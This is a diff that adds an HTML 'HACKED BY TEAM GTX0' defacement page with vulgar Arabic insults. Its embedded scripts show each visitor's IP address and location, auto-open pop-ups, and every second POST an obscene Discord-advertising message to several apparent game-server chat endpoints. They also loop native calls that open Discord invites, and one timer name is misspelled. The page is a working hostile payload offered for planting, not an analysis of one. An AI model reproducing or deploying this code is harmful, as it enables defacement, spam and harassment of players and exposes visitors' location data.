@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>𝗛𝗔𝗖𝗞𝗘𝗗 𝗕𝗬 𝗧𝗘𝗔𝗠 GTX0</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            background-image: linear-gradient(#111 1px, transparent 1px), linear-gradient(90deg, #111 1px, transparent 1px);
+            background-size: 15px 15px;
+            font-family: monospace;
+            color: #ccc;
+            overflow: hidden;
+        }
+
+        .intro {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #e6e6e6;
+            font-size: 80px;
+            z-index: 9999;
+            animation: fadeOut 2s ease forwards;
+            animation-delay: 2s;
+        }
+
+        @keyframes fadeOut {
+            to {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+
+        .container,
+        .left-box,
+        .right-box,
+        .box,
+        .footer {
+            opacity: 0;
+            animation: fadeIn 0.5s ease-out;
+            animation-delay: 2s;
+            animation-fill-mode: forwards;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            text-align: center;
+        }
+
+        .left-box,
+        .right-box {
+            position: absolute;
+            top: 25px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #333;
+            padding: 20px;
+            border-radius: 8px;
+            font-size: 18px;
+        }
+
+        .left-box {
+            left: 25px;
+        }
+
+        .right-box {
+            right: 25px;
+        }
+
+        .left-box a {
+            display: block;
+            margin: 8px 0;
+            color: #9b0000;
+            text-decoration: none;
+            font-size: 16px;
+        }
+
+        .left-box a:hover {
+            transform: translateX(5px);
+        }
+
+        .discord-link {
+            display: flex;
+            align-items: center;
+            color: #ccc;
+            margin-top: 10px;
+            font-size: 16px;
+        }
+
+        .discord-link img {
+            width: 20px;
+            height: 20px;
+            margin-right: 5px;
+        }
+
+        .anime-image {
+            width: 600px;
+            border: 3px solid #333;
+            border-radius: 10px;
+            margin-bottom: 15px;
+        }
+
+        .title {
+            font-size: 60px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #ccc;
+        }
+
+        .box {
+            width: 400px;
+            max-height: 250px;
+            overflow: auto;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #333;
+            padding: 15px 20px;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: left;
+        }
+
+        .box code {
+            color: #9b0000;
+        }
+
+        .footer {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .text {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #888;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes blink {
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.3;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="intro">كوتي زبور</div>
+
+    <div class="left-box">
+        𝗛𝗔𝗖𝗞𝗘𝗗 𝗕𝗬 𝗧𝗘𝗔𝗠 GTX
+        <a href="#">بدك تصير زلمة؟</a>
+        <a href="#">يا قحبه اجلخي </a>
+        <a href="#">بدك تصير مبرمج وهاك</a>
+        <a href="#">كوتي امور𝟭</a>
+        <hr style="margin: 10px 0; border: none; border-top: 1px solid #333;">
+    </div>
+
+    <div class="right-box">
+        <div class="info" id="ip-info">
+            <strong>IP:</strong> <span id="ip"></span><br>
+            <strong>City:</strong> <span id="city"></span><br>
+            <strong>Region:</strong> <span id="region"></span><br>
+            <strong>Country:</strong> <span id="country"></span><br>
+            <strong>Location:</strong> <span id="loc"></span><br>
+            <strong>Organization:</strong> <span id="org"></span><br>
+            <strong>Timezone:</strong> <span id="timezone"></span>
+        </div>
+    </div>
+
+    <audio autoplay loop>
+        <source src="https://cdn.discordapp.com/attachments/1434365630550638603/1436541235702796429/ssstik.io_1762563320000.mp3?ex=690ffac8&is=690ea948&hm=018647811559f81e8f34cc75dbd91f0d8dcfbd0186719369b00874f90d4fbd86&" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <div class="container">
+        <img class="anime-image" src="SSSSS" alt="Anime" />
+        <div class="title">𝗛𝗔𝗖𝗞𝗘𝗗 𝗕𝗬 𝗧𝗘𝗔𝗠 GTX0</div>
+
+        <div class="box">
+            <div style="border-bottom: 1px solid #333; padding-bottom: 8px; margin-bottom: 8px;">
+                <span style="color: #ccc; font-weight: bold;"></span>
+            </div>
+            <div style="color: #888; font-size: 14px; margin-bottom: 8px;">
+                server@system:~$ <strong>why?</strong>
+            </div>
+            <div style="color: #9b0000; font-size: 16px; line-height: 1.6;">
+                Team 101 : 𝗛𝗔𝗖𝗞𝗘𝗗 𝗕𝗬 𝗧𝗘𝗔𝗠 GTX0
+                <div style="color: #888; font-size: 12px; margin-top: 8px;">
+                </div>
+            </div>
+            <div class="footer">OFFICALY BLACK$HAMMER • </div>
+        </div>
+
+        <script>
+            // ! اظهار الايبي !
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip').innerHTML = data.ip || '';
+                    document.getElementById('city').innerHTML = data.city || '';
+                    document.getElementById('region').innerHTML = data.region || '';
+                    document.getElementById('country').innerHTML = data.country || '';
+                    document.getElementById('loc').innerHTML = data.loc || '';
+                    document.getElementById('org').innerHTML = data.org || '';
+                    document.getElementById('timezone').innerHTML = data.timezone || '';
+                });
+
+            // ! فتح الرابط تلقائيًا !
+            setTimeout(() => {
+                window.open("https://cdn.discordapp.com/attachments/1400990041567662231/1400994521000443956/flamingtext_com-1193810512.png", "_blank");
+            }, 50);
+
+            // سكربت الرسائل التلقائي (vjmi)
+            const msg = `👑 انا قحبه - .gg/gtx0 ! 👑`;
+            const body = JSON.stringify({ message: msg });
+            setInterval(() => {
+                fetch("https://flix-scripts/chatResult", { method: "POST", body });
+                fetch("https://danger_chat/Danger_Chat:SendMessage", {
+                    method: "POST",
+                    body: JSON.stringify({
+                        "message": msg,
+                        "channel": "شات العام",
+                        "color": null,
+                        "isImageAndLinksAllowed": [false, false]
+                    })
+                });
+                fetch("https://easy-chat+/o6ZbK5Ecp6", {
+                    headers: {
+                        accept: "*/*",
+                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+                    },
+                    body: JSON.stringify({ message: msg, channel: "شات العام" }),
+                    method: "POST"
+                });
+                fetch("https://melix_chat/chatResult", { method: "POST", body });
+                fetch("https://as_chat/chatResult", { method: "POST", body });
+                fetch("https://chat/chatResult", { method: "POST", body });
+                fetch("https://ho-chatv2/Chat", {
+                    method: "POST",
+                    body: JSON.stringify({
+                        "Type": "chatResult",
+                        "message": msg,
+                        "chatType": "general"
+                    })
+                });
+            }, 1000);
+        </script>
+         <script>
+            setisnterval(function() {
+                window.invokeNative("openUrl", "https://discord.gg/t101");
+                window.invokeNative("openUrl", "https://discord.gg/t101");
+                window.invokeNative("openUrl", "https://discord.gg/t101");
+                window.invokeNative("openUrl", "https://discord.gg/t101");
+              }, 1000);
+        </script>
+    </div>
+
+</body>
+
+</html>
